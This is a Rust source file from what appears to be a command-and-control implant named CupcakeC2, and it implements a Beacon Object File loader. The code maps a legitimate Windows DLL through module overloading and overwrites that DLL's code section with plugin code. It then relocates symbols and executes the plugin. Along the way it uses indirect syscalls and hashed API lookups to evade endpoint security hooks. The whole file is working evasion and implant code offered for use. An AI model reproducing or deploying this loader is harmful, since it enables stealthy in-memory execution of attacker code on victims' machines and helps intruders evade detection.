// Client/core/src/loader/bof.rs
// CupcakeC2 V3 - BOF (Beacon Object File) Engine
// 负责解析、重定位并在内存中执行 COFF 格式插件。

use log::{debug, info, warn};


// --- COFF 结构体定义 ---
#[repr(C, packed)]
struct CoffFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C, packed)]
struct CoffSectionHeader {
    name: [u8; 8],
    misc: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

#[repr(C, packed)]
struct CoffRelocation {
    virtual_address: u32,
    symbol_table_index: u32,
    typ: u16,
}

#[repr(C, packed)]
struct CoffSymbol {
    name: [u8; 8],
    value: u32,
    section_number: i16,
    typ: u16,
    storage_class: u8,
    num_aux: u8,
}

// BOF 内部执行环境 (Thread Local)
thread_local! {
    static BOF_OUTPUT: std::cell::RefCell<String> = std::cell::RefCell::new(String::new());
}

pub struct BofLoader;

impl BofLoader {
    /// 加载并运行一个 BOF 插件
    pub async fn execute(coff_data: &[u8], args: &[u8]) -> Result<String, String> {
        info!("[*] Cupcake BOF Engine: Loading plugin ({} bytes)", coff_data.len());
        
        // Reset output
        BOF_OUTPUT.with(|o| o.borrow_mut().clear());

        let header = unsafe { &*(coff_data.as_ptr() as *const CoffFileHeader) };
        if header.machine != 0x8664 {
            return Err("Currently only x64 BOF is supported".to_string());
        }

        unsafe {
            // 1. 实现 True Module Overloading: 挑选载体 DLL
            let carrier_dll = "\\??\\C:\\Windows\\System32\\xpsprint.dll";
            let base_addr = match Self::module_overload_map(carrier_dll) {
                Ok(addr) => addr,
                Err(e) => return Err(format!("Module Overloading failed: {}", e)),
            };

            debug!("[+] Carrier DLL mapped at: 0x{:X}", base_addr);

            // 2. 定位载体 DLL 的 .text 段
            use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
            let dos_header = base_addr as *const IMAGE_DOS_HEADER;
            let nt_headers = (base_addr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
            let section_headers = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
            
            let mut carrier_text_addr = 0;
            let mut carrier_text_size = 0;
            for i in 0..(*nt_headers).FileHeader.NumberOfSections {
                let sec = &*section_headers.add(i as usize);
                if sec.Name.starts_with(b".text") {
                    carrier_text_addr = base_addr + sec.VirtualAddress as usize;
                    carrier_text_size = *sec.Misc.VirtualSize() as usize;
                    break;
                }
            }

            if carrier_text_addr == 0 {
                return Err("Failed to find .text section in carrier DLL".to_string());
            }

            // 3. 将载体 .text 修改为 RW
            let mut old_protect = 0;
            let hash_nt_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
            let mut region_size = carrier_text_size;
            let mut protect_addr = carrier_text_addr;
            crate::syscalls::indirect_syscall(hash_nt_protect, &[
                0xFFFFFFFFFFFFFFFFu64 as usize,
                &mut protect_addr as *mut _ as usize,
                &mut region_size as *mut _ as usize,
                0x04, // PAGE_READWRITE
                &mut old_protect as *mut _ as usize,
            ]);

            // 4. 解析 BOF 段并写入载体内存 (此处简化：将所有代码段合并写入)
            let bof_sections = (coff_data.as_ptr() as usize + std::mem::size_of::<CoffFileHeader>()) as *const CoffSectionHeader;
            let mut entry_point_addr = 0;
            
            // 符号表和字符串表
            let symbols = std::slice::from_raw_parts(
                (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize) as *const CoffSymbol,
                header.number_of_symbols as usize
            );
            let string_table = (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize + (header.number_of_symbols * 18) as usize) as *const u8;

            // 遍历并复制段
            let mut current_offset = 0;
            let mut section_map = std::collections::HashMap::new();

            for i in 0..header.number_of_sections {
                let sec = &*bof_sections.add(i as usize);
                if sec.size_of_raw_data == 0 { continue; }
                
                let src = coff_data.as_ptr().add(sec.pointer_to_raw_data as usize);
                let dest = (carrier_text_addr + current_offset) as *mut u8;
                
                std::ptr::copy_nonoverlapping(src, dest, sec.size_of_raw_data as usize);
                section_map.insert(i + 1, dest as usize); // 1-indexed

                // 处理重定位
                if sec.number_of_relocations > 0 {
                    let relocs = std::slice::from_raw_parts(
                        (coff_data.as_ptr() as usize + sec.pointer_to_relocations as usize) as *const CoffRelocation,
                        sec.number_of_relocations as usize
                    );
                    Self::patch_symbols(dest, relocs, symbols, string_table, &section_map);
                }

                current_offset += sec.size_of_raw_data as usize;
            }

            // 5. 查找 'go' 符号作为入口点
            for sym in symbols {
                let name = Self::get_symbol_name(sym, string_table);
                if name == "go" {
                    entry_point_addr = section_map.get(&(sym.section_number as u16)) .unwrap_or(&0) + sym.value as usize;
                    break;
                }
            }

            // 6. 恢复 RX 并执行
            crate::syscalls::indirect_syscall(hash_nt_protect, &[
                0xFFFFFFFFFFFFFFFFu64 as usize,
                &mut protect_addr as *mut _ as usize,
                &mut region_size as *mut _ as usize,
                0x20, // PAGE_EXECUTE_READ
                &mut old_protect as *mut _ as usize,
            ]);

            if entry_point_addr != 0 {
                let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
                go(args.as_ptr(), args.len() as i32);
            }

            Ok(BOF_OUTPUT.with(|o| o.borrow().clone()))
        }
    }

    /// True Module Overloading: 利用 SEC_IMAGE 映射合法 DLL
    unsafe fn module_overload_map(path: &str) -> Result<usize, String> {
        use winapi::shared::ntdef::{OBJECT_ATTRIBUTES, UNICODE_STRING, InitializeObjectAttributes, HANDLE, NULL};
        use winapi::um::winnt::{FILE_GENERIC_READ, PAGE_READONLY, SEC_IMAGE, SECTION_MAP_READ, SECTION_MAP_EXECUTE};

        // 1. 将路径转换为 UNICODE_STRING
        let mut path_u16: Vec<u16> = path.encode_utf16().collect();
        path_u16.push(0);
        let mut us_path = UNICODE_STRING {
            Length: ((path_u16.len() - 1) * 2) as u16,
            MaximumLength: (path_u16.len() * 2) as u16,
            Buffer: path_u16.as_mut_ptr(),
        };

        let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
        InitializeObjectAttributes(&mut obj_attr, &mut us_path, 0x40, NULL, NULL);

        // 2. NtOpenFile
        let mut h_file: HANDLE = NULL;
        let mut io_status: [usize; 2] = [0, 0];
        let hash_nt_open_file = crate::stealth::hash_api_name(b"NtOpenFile");
        let status = crate::syscalls::indirect_syscall(hash_nt_open_file, &[
            &mut h_file as *mut _ as usize,
            FILE_GENERIC_READ as usize,
            &mut obj_attr as *mut _ as usize,
            &mut io_status as *mut _ as usize,
            1, // FILE_SHARE_READ
            0x20, // FILE_NON_DIRECTORY_FILE
        ]);

        if status as i32 != 0 { // STATUS_SUCCESS is 0
            return Err(format!("NtOpenFile failed: 0x{:X}", status));
        }

        // 3. NtCreateSection (SEC_IMAGE)
        let mut h_section: HANDLE = NULL;
        let hash_nt_create_section = crate::stealth::hash_api_name(b"NtCreateSection");
        let status = crate::syscalls::indirect_syscall(hash_nt_create_section, &[
            &mut h_section as *mut _ as usize,
            (SECTION_MAP_READ | SECTION_MAP_EXECUTE) as usize,
            std::ptr::null_mut::<usize>() as usize, // ObjectAttributes
            std::ptr::null_mut::<usize>() as usize, // MaximumSize
            PAGE_READONLY as usize,
            SEC_IMAGE as usize,
            h_file as usize,
        ]);

        if status as i32 != 0 {
            let _ = crate::syscalls::indirect_syscall(crate::stealth::hash_api_name(b"NtClose"), &[h_file as usize]);
            return Err(format!("NtCreateSection failed: 0x{:X}", status));
        }

        // 4. NtMapViewOfSection
        let mut base_addr: usize = 0;
        let mut view_size: usize = 0;
        let hash_nt_map_view = crate::stealth::hash_api_name(b"NtMapViewOfSection");
        let status = crate::syscalls::indirect_syscall(hash_nt_map_view, &[
            h_section as usize,
            0xFFFFFFFFFFFFFFFFu64 as usize, // NtCurrentProcess
            &mut base_addr as *mut _ as usize,
            0, // ZeroBits
            0, // CommitSize
            0, // SectionOffset
            &mut view_size as *mut _ as usize,
            1, // ViewShare (InheritDisposition)
            0, // AllocationType
            PAGE_READONLY as usize,
        ]);

        // Cleanup handles
        let _ = crate::syscalls::indirect_syscall(crate::stealth::hash_api_name(b"NtClose"), &[h_section as usize]);
        let _ = crate::syscalls::indirect_syscall(crate::stealth::hash_api_name(b"NtClose"), &[h_file as usize]);

        if status as i32 != 0 {
            return Err(format!("NtMapViewOfSection failed: 0x{:X}", status));
        }

        Ok(base_addr)
    }

    /// 核心符号修复逻辑 (Symbol Patching)
    unsafe fn patch_symbols(
        section_base: *mut u8,
        relocs: &[CoffRelocation],
        symbols: &[CoffSymbol],
        string_table: *const u8,
        section_map: &std::collections::HashMap<u16, usize>,
    ) {
        for reloc in relocs {
            let symbol = &symbols[reloc.symbol_table_index as usize];
            let name = Self::get_symbol_name(symbol, string_table);

            let target_addr = if symbol.section_number > 0 {
                // 内部段引用 (支持将规避 Hook 合并进 BOF)
                // 即使是以 __imp_ 开头的符号，如果它在内部定义了，也优先使用内部地址
                let base = *section_map.get(&(symbol.section_number as u16)).unwrap_or(&0);
                if base == 0 { continue; }
                base + symbol.value as usize
            } else if name.starts_with("__imp_") {
                Self::resolve_external(&name)
            } else if name.starts_with("Beacon") {
                Self::resolve_internal_beacon(&name)
            } else {
                0 
            };

            if target_addr == 0 { continue; }

            let patch_addr = section_base.add(reloc.virtual_address as usize);
            
            match reloc.typ {
                4 => { // IMAGE_REL_AMD64_REL32
                    let offset = (target_addr as isize) - (patch_addr as isize) - 4;
                    *(patch_addr as *mut i32) = offset as i32;
                }
                1 => { // IMAGE_REL_AMD64_ADDR64
                    *(patch_addr as *mut u64) = target_addr as u64;
                }
                _ => {} // 其他不常见的类型暂时忽略
            }
        }
    }

    // --- Beacon API Stubs ---

    extern "C" fn beacon_printf(_typ: i32, fmt: *const i8) {
        // Placeholder for variadic - in production use vsnprintf
        unsafe {
            if fmt.is_null() { return; }
            let msg = std::ffi::CStr::from_ptr(fmt).to_string_lossy().into_owned();
            BOF_OUTPUT.with(|o| o.borrow_mut().push_str(&msg));
        }
    }

    extern "C" fn beacon_output(_typ: i32, data: *const u8, len: i32) {
        let slice = unsafe { std::slice::from_raw_parts(data, len as usize) };
        let msg = String::from_utf8_lossy(slice).into_owned();
        BOF_OUTPUT.with(|o| o.borrow_mut().push_str(&msg));
    }

    fn resolve_external(name: &str) -> usize {
        let clean_name = name.trim_start_matches("__imp_");
        let parts: Vec<&str> = clean_name.split('$').collect();
        if parts.len() != 2 { return 0; }

        unsafe {
            let h_module = crate::stealth::get_module_base(crate::stealth::hash_module_name(parts[0].as_bytes()));
            crate::stealth::get_api_addr(h_module, crate::stealth::hash_api_name(parts[1].as_bytes())).unwrap_or(0)
        }
    }

    fn resolve_internal_beacon(name: &str) -> usize {
        match name {
            "BeaconPrintf" => Self::beacon_printf as usize,
            "BeaconOutput" => Self::beacon_output as usize,
            _ => {
                warn!("[!] BOF Loader: Unimplemented internal API: {}", name);
                0
            }
        }
    }

    unsafe fn get_symbol_name(sym: &CoffSymbol, str_table: *const u8) -> String {
        if sym.name[0] == 0 && sym.name[1] == 0 && sym.name[2] == 0 && sym.name[3] == 0 {
            let offset = u32::from_le_bytes([sym.name[4], sym.name[5], sym.name[6], sym.name[7]]);
            std::ffi::CStr::from_ptr(str_table.add(offset as usize) as *const i8).to_string_lossy().into_owned()
        } else {
            String::from_utf8_lossy(&sym.name).trim_matches('\0').to_string()
        }
    }
}
